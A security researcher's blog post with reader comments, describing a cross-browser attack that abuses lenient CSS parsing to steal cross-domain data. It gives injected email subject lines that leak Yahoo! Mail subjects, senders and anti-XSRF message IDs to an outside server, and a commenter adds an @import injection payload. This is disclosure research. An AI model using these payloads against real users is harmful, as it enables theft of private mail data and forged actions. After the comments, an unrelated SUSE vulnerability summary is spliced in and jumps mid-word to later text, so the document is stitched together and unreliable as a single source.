### Generic cross-browser cross-domain theft

Well, here's a nice little gem for the festive season. I like it for a few distinct reasons:

2. It's one of those cases where if you look at web standards from the correct angle, you can see a security vulnerability specified.

4. Accordingly, it affected all 5 major browsers. And likely the rest.

6. You can still be a theft victim even with plugins *and JavaScript* disabled!

It's much less serious than it could be because there are restrictions on the format of cross-domain data which can be stolen, and the attacker needs to be able to exercise limited control of the target theft page.
The issue is best introduced with an example. The example chosen is deliberately a little bit involved and not too severe. This is to give the upcoming browser updates a chance to get deployed.

**Example: Yahoo! Mail cross-domain subject line theft and e-mail deletion**

(It's important to note there is no apparent failing of the web app in question here).

* Step 1: E-mail your victim@yahoo.com with the subject line ');}

* Step 2: Wait a bit (assume that other e-mails are delivered to the victim at this time)

* Step 3: E-mail your victim@yahoo.com with the subject line {}body{background-image:url('http://google.com/ and include in the body: PLEASE CLICK <http://cevans-app.appspot.com/static/yahoocss.html>

* Step 4: Mild profit if the victim clicks the link.

If you set up the above scenario as a test, you might see something like this in an alert box upon clicking the link:
 `url(http://google.com/%3C/a%3E%3Cbr/%3E%3Cspan%20class=%22j%22%3EChris%20Evans%3C/span%3E%3C/span%3E%3C/div%3E%3C/div%3E%3Cdiv%20class=%22h%22%3E%3Cdiv%20class=%22i%22%3E%3Cspan%3E%3Ca%20href=%22/p/mail/messageDetail?fid=Inbox&amp;mid=1_3493_AGvHtEQAAWFgSgIzgAlWYQXHqDY&3=q%22%3ESuper%20sensitive%20subject%3C/a%3E%3Cbr/%3E%3Cspan%20class=%22j%22%3EChris%20Evans%3C/span%3E%3C/span%3E%3C/div%3E%3C/div%3E%3Cdiv%20class=%22h%22%3E%3Cdiv%20class=%22i%22%3E%3Cspan%3E%3Ca%20href=%22/p/mail/messageDetail?fid=Inbox&amp;mid=1_3933_AGTHtEQAAM%2FHSgIzawpE8Fwm1%2FI&5=x%22%3E)`
The above text is stolen cross-domain, and the interesting pieces are highlighted in bold. The data includes the subjects, senders and "mid" value for all e-mails received between the two set-up e-mails we sent the victim.
Although leaking of subjects and senders is not ideal, it's the "mid" value that interests us most as an attacker. This would *appear* to be a secure / unguessable ID. Accordingly, it is reasonable for the mail application to rely on it as a distinct anti-XSRF token. This is indeed the case for the "delete" operation, implemented as a simple HTTP GET request. Interestingly, the "forward" operation seems to have an additional anti-XSRF token in the POST body, making the "mid" leak not nearly as serious as it could have been.

That's how this whole attack proceeds in its most powerful form: leak a small amount of text cross-domain, and then bingo! if the leaked text happens to include a global anti-XSRF token.

**How does it work?**

It works by abusing the standards relating to the loading of CSS style sheets. Approximately, the standards are:

* Send cookies on any load of CSS, including cross-domain.

* When parsing the returned CSS, ignore any amount of crap leading up to a valid CSS descriptor.

By controlling a little bit of text in the victim domain, the attacker can inject what appears to be a valid CSS string. It does not matter what proceeds this CSS string: HTML, binary data, JSON, XML. The CSS parser will ruthlessly hunt down any CSS constructs within whatever blob is pulled from the victim's domain. To the CSS parser, the text in the above attack looks like this:
 `(some HTML junk; whatever){} body{background-image:url('http://google.com/%3C/a...stolen stuff...')}(some trailing HTML junk)`
So, the background of the attacker's page will be styled with a background image loaded from an URL, the path of which contains stolen data! One lovely twist of using a CSS string which is an URL is that it will be automatically fetched even if JavaScript is turned off! The stolen data is then harvested by the attacker from their web server logs.
Fortunately, there are various barriers to exploiting this:

* Any newlines in the injected string break the CSS parse. This is a very common condition which stops potentially serious attacks.

* CSS strings may be quoted within the ' or " characters. In a context where both of these are escaped (HTML escaped, URL escaped, whatever), it will not be possible to inject a CSS string.

* The attacker needs control of two injection points: pre-string and post-string. For many sensitive pages, the attacker won't have sufficient influence over the page data via URL params or reflection of attacker data.

General areas that are more susceptible to this attack include:

* JSON / XML feeds (common lack of newlines; no requirement to escape " (JSON strings) or ' (XML text nodes)).

* Socially-related websites (the victim is always browsing attacker-controlled strings such as comments on their mundane photos, etc).

**How do we fix it?**

It would be nice to be able to not send cookies for cross-domain CSS loads; however that would certainly break stuff and it's hard to measure what without actually causing the breakage.

It would be nice to be strict on the MIME type when loading CSS resources -- if not globally then at least for cross-domain loads. But this breaks high profile sites, \*cough\* configure.dell.com and text/plain \*cough\*. (To be fair, it gets much worse with many sites even using text/html, application/octet-stream, it goes on).

A good balance is to require the alleged CSS to at least start with well-formed CSS, iff it is a cross-domain load and the MIME type is broken. This is the approach I used in my pending WebKit patch.

Note that fixing this issue also fixes my previous attack of using cross-domain CSS to reliably tell if someone is logged in or not:

**Credits**

* Aaron Sigel, for interesting discussions about using /\* styled multi-line comments to bypass the newline restriction. Looks like it's not possible to recover comment text but we didn't test all the browsers.

* Opera, for seemingly fixing this in v10.10 - although I don't know the exact heuristic used.

* The WebKit and Mozilla communities for good feedback on approaches and patches.

Sweet P.O.C. I'd actually be really curious how many legit pages break if you prevented cookies being sent with cross-domain CSS loads. I wouldn't expect this number to be too high, though I agree that stricter CSS validation is the better route.

@jd: No, browsers will ignore the MIME type (unless they are in standards mode, but this is not a default configuration and the evil page loading the CSS can often change modes itself). The reason browsers ignore the MIME type to load CSS is that there are unfortunately a bunch of web sites out there that serve CSS with broken MIME types.

How is it not the application's fault if the attack relies on being able to inject code? I don't see how this is any different than the traditional JavaScript injection attacks, except that this uses CSS and works with JS disabled.

What is it that developers should never trust? Oh yeah, it's user submitted data.

@Anonymous: I recommend a more careful reading of the blog post carefully. What's the bug in Yahoo! Mail? (there isn't one). We're not talking about a JavaScript injection (caused by failure to HTML escape, JS escape, etc). We're talking about making a CSS construct appear in the victim's page / feed / JSON API / etc. This uses characters such as { which remain intact even with correct escaping in the application.

And if the injected subject line doesn't use a single or double quote, the attack doesn't work, now does it? You said it yourself:

"CSS strings may be quoted within the ' or " characters. In a context where both of these are escaped (HTML escaped, URL escaped, whatever), it will not be possible to inject a CSS string."

I don't know how I could read that any differently. Either single/double quotes are escaped properly or they aren't. If they aren't, the application is at fault, it doesn't matter what kind of application it is.

@Anonymous: ah, thanks for the clarification, now I see the bit you're missing. You do ask a good question. The HTML characters it is mandatory to escape vary depending on context. For example, inside a "-quoted HTML attribute value, you absolutely need to escape " characters. However inside of a tag, such as **hello"quote** things are different. There are similar subtleties to the escaping rules for XML and JSON, involving ' vs " that make those particularly interesting vectors too.

Hi Chris, kudos for your research, i've found it very interesting. However i think there is another constraint for this technique to work: http requests for css are done using GET so it is impossible to perform a cross domain theft on resources that are retrieved through POST requests. do you agree?

Hey Chris, been a while ;D. This reminds me of the CSS injection bug found by a guy over here:
http://d.hatena.ne.jp/ofk/20081111/1226407593. If you can inject portions of CSS into a field and have it displayed, ie6 (maybe 7?) would parse it as valid css and allow you to read data contained in the field. for example using a css import: @import url("http://google.co.jp/search?source=ig&hl=en&rlz=&=&q={}body{font-family:");
Then you were able to read portions of the document like: alert(document.body.currentStyle.fontFamily).

I'm pretty sure you're wrong. Third party cookies have to do with how cookies are set.

This exploit doesn't involve setting any cookies in weird ways. It just sends the cookies in weird ways.

First shouldn't "A good balance is to require the alleged CSS to at least start with well-formed CSS, iff it is a cross-domain load and the MIME type is broken." use only if instead of iff(if and only if) as that's interpreted that you may only use well formed CSS if it's cross-domain and the MIME type is broken; Which implies Presuming that iff takes precedence over 'and' that you may not use well formed CSS if it's a same domain request, else if and takes precedence over and then it implies that you may not use well formed CSS on a request which is on the same domain and has a valid MIME type. Anyway that's not too important, jut being a bit pedantic, perhaps I'm wrong.

Now my question, I know this is an old post and things may have been different back then but hasn't CSS only ever been parsed inside of a designated area such as a style tag or the style attribute, if so why would user input ever end up in there in the Yahoo email subject. The example doesn't explicitly state you added an element also from your comments it'd seem that there was no HTML injection so I don't see how that could have even been parsed as CSS instead of just plain text or rather HTML.

In addition I had to re-read the article and comments to presume you mean that the link to "http://cevans-app.appspot.com/static/yahoocss.html" will be requested and included into the document as a CSS document I fail to see how. First it's included part way through a background-image: url(); argument, the actual domain being requested should be a google.com and everything following should be part of the requested URI and not a new request which isn't much of a problem you control the initial URL anyway so you could change that to your malicious domain okay so the request is made as if to an image which could contain it's own style tags which would get parsed, but this doesn't explain why aforementioned URI is relevant. I assume you were saying that the background-img would be parsed and the XSRF tokens would be contained in the URI could be used to forge a GET request by the requested background-image URI ?

so to re-iterate why would the CSS parser pass the entire document? Isn't the entire point of the style tag/attribute to indicate where CSS exists and should be parsed from.
And why what relevance has the second link in the background-img URI?

1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- OpenOffice\_org
This update of OpenOffice\_org does not allow macros written in Python to
be executed without permission, CVE-2010-0395.
This also provides the maintenance update to OpenOffice.org-3.2.1.
Details about all upstream changes can be found at
<http://development.openoffice.org/releases/3.2.1.html>
Affected Products: SLE10-SP3, SLE11, openSUSE 11.0, 11.1, 11.2
- apache2-slms
Insufficient quoting of parameters in SLMS could allow for
cross-site-request-forgery (CSRF) attacks (CVE-2010-1325).
Affected Products: SLE11
- aria2
This aria2 update to 1.9.3 fixes a metalink name Directory Traversal
issue (CVE-2010-1512).
Affected Products: openSUSE 11.2
- bogofilter
This update of bogofilter/bogolexer fixes a heap based buffer underflow
vulnerability which could be exploited to cause a denial of service or
potentially execute arbitrary code (CVE-2010-2494).
Affected Products: SLE11, openSUSE 11.0, 11.1, 11.2
- cifs-mount/samba
This update of the Samba server package fixes security issues and bugs.
Following security issues were fixed:
- CVE-2010-2063: A buffer overrun was possible in chain\_reply code in
3.3.x and below, which could be used to crash the
samba server or potentially execute code.
- CVE-2010-0787: Take extra care that a mount point of mount.cifs is
not changed during mount.
- CVE-2010-0926: With enabled "wide links" samba follows symbolic links
on the server side, therefore allowing clients to
overwrite arbitrary files. This update changes the
default setting to have "wide links" disabled by default.
The new default only works if "wide links" is not set
explicitly in smb.conf.
- CVE-2010-0547: Due to a race condition in mount.cifs a local attacker
could corrupt /etc/mtab if mount.cifs is installed setuid
root. mount.cifs is not setuid root by default and it is
not recommended to change that.
Affected Products: SLES9, SLE10-SP3, SLE11, openSUSE 11.0, 11.1
- clamav
This update fixes a off-by-one buffer overflow (CVE-2010-1640) and a
crash while parsing PDFs (CVE-2010-1639, CVE-2010-2077) in clamav
that can be used as a remote denial of service attack.
Affected Products: SLES9, SLE10-SP3, SLE11, openSUSE 11.0, 11.1, 11.2
- exim
Two local vulnerabilities have been fixed in the exim MTA
which allowed attackers to create arbitrary files or
to change ownership of arbitrary files. CVE-2010-2023 and
CVE-2010-2024 have been assigned to these issues.
Affected Products: openSUSE 11.1, 11.2, 11.3
- ghostscript
Specially crafted postscript (.ps) files could cause buffer
overflows in ghostscript that could potentially be exploited to
execute arbitrary code (CVE-2010-1628, CVE-2010-1869, CVE-2009-4270)
Additionally ghostscript, by default, reads some initialization files from
the current working directory. Local attackers could potentially exploit
that to have other users execute arbitrary commands by placing such
files e.g. in /tmp (CVE-2010-2055).
Affected Products: SLE11, openSUSE 11.0, 11.1, 11.2, 11.3
- gnutls
The ASN.1 parser for X.509 certificates used a wrong integer type for
extracting a certficiate's serial number. On 64bit big-endian
architectures this could result in bypassing CRL checks (CVE-2010-0731).
Affected Products: SLES9
- krb5
This update fixes a denial-of-service vulnerability in kadmind. A
remote attack can send a malformed GSS-API token that triggers a
NULL pointer dereference.
(CVE-2010-1321: CVSS v2 Base Score: 6.8 (MEDIUM) (AV:N/AC:L/Au:S/C:N/I:N/A:C))
Affected Products: SLE10-SP3, SLE11, openSUSE 11.0, 11.1, 11.2
- kvirc
This update of KVirc fixes a remotely exploitable format string and
directory traversal vulnerability (CVE-2010-2451, CVE-2010-2452).
Additionally KVirc does not further allow remote client to send
arbitrary CTCP commands. (CVE-2010-2785)
Affected Products: openSUSE 11.1, 11.2, 11.3
- lftp
This update of lftp improves the filename handling of downloaded files
to avoid downloading arbitrary content to unexpected locations (like
.login). (CVE-2010-2251)
Affected Products: openSUSE 11.0, 11.1, 11.2
- libpython2\_6-1\_0
This update of python has a copy of libxmlrpc that is vulnerable to
denial of service bugs that can occur while processing malformed XML
input.
- CVE-2009-2625: CVSS v2 Base Score: 5.0: Permissions, Privileges,
and Access Control (CWE-264)
- CVE-2009-3720: CVSS v2 Base Score: 5.0: Insufficient Information
- CVE-2009-3560: CVSS v2 Base Score: 5.0: Buffer Errors (CWE-119)
Affected Products: SLES9, SLE10-SP3, SLE11, openSUSE 11.0, 11.1, 11.2
- libtiff
This update of libtiff fixes several integer overflows that could lead
to a corrupted heap memory. This bug can be exploited remotely with a
crafted TIFF file to cause an application crash or probably to execute
arbitrary code. (CVE-2010-1411)
Affected Products: SLES9, SLE10-SP3, openSUSE 11.0, 11.1, 11.2
- libvorbis
This update of libvorbis fixes a memory corruption while parsing OGG
files. This bug was exploitable by remote attackers to cause an
application crash and could probably be exploited to execute arbitrary
code.
CVE-2009-2663: CVSS v2 Base Score: 6.8: Resource Management Errors (CWE-399)
Affected Products: SLES9, SLE10-SP3, SLE11, openSUSE 11.0, 11.1, 11.2
- lxsession
lxsession-logout did not properly lock the screen before suspending,
hibernating and switching between users which could allow attackers with
physical access to take control of the system to obtain sensitive infor-

bit of old files during package updates. (CVE-2010-2059)
Affected Products: openSUSE 11.0
- postgresql
This update of postgresql was pblished to fix several minor security
vulnerabilities:
- CVE-2010-1975: postgresql does not properly check privileges during
certain RESET ALL operations, which allows remote
authenticated users to remove arbitrary parameter
settings.
- CVE-2010-1170: The PL/Tcl implementation in postgresql loads Tcl
code from the pltcl\_modules table regardless of the
table's ownership and permissions, which allows remote
authenticated users, with database-creation privileges,
to execute arbitrary Tcl code.
- CVE-2010-1169: Postgresql does not properly restrict PL/perl procedures,
which allows remote authenticated users, with database-
creation privileges, to execute arbitrary Perl code via
a crafted script.
- CVE-2010-0733: An integer overflow in postgresql allows remote authen-
ticated users to crash the daemon via a SELECT statement.
Affected Products: SLE10-SP3, SLE11, openSUSE 11.0, 11.1, 11.2
- python-mako
Python-mako was prone to a Cross-Site Scripting flaw due to improperly
escaped single quotes (CVE-2010-2480).
Affected Products: openSUSE 11.2, 11.3
- squidGuard
Two buffer overflows in squidGard were fixed:
- CVE-2009-3700: Buffer overflow in sgLog.c in squidGuard 1.3 and 1.4
allows remote attackers to cause a denial of service
(application hang or loss of blocking functionality)
via a long URL with many / (slash) characters, related
to "emergency mode."
- CVE-2009-3826: Multiple buffer overflows in squidGuard 1.4 allow remote
attackers to bypass intended URL blocking via a long URL,
related to (1) the relationship between a certain buffer
size in squidGuard and a certain buffer size in Squid and
(2) a redirect URL that contains information about the
originally requested URL.
Affected Products: openSUSE 11.1, 11.2, 11.3

- w3m
w3m did not handle embedded nul characters in the common name and in
subject alternative names of x509 certificates.
CVE-2010-2074 has been assigned to this issue.
This update also turns on verification of x509 certificates by default
which was not the case before.
Affected Products: SLE10-SP3, SLE11, openSUSE 11.0, 11.1, 11.2
- xmlrpc-c
This update of libxmlrpc is not vulnerable to denial of service bugs
that can occur while processing malformed XML input.

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
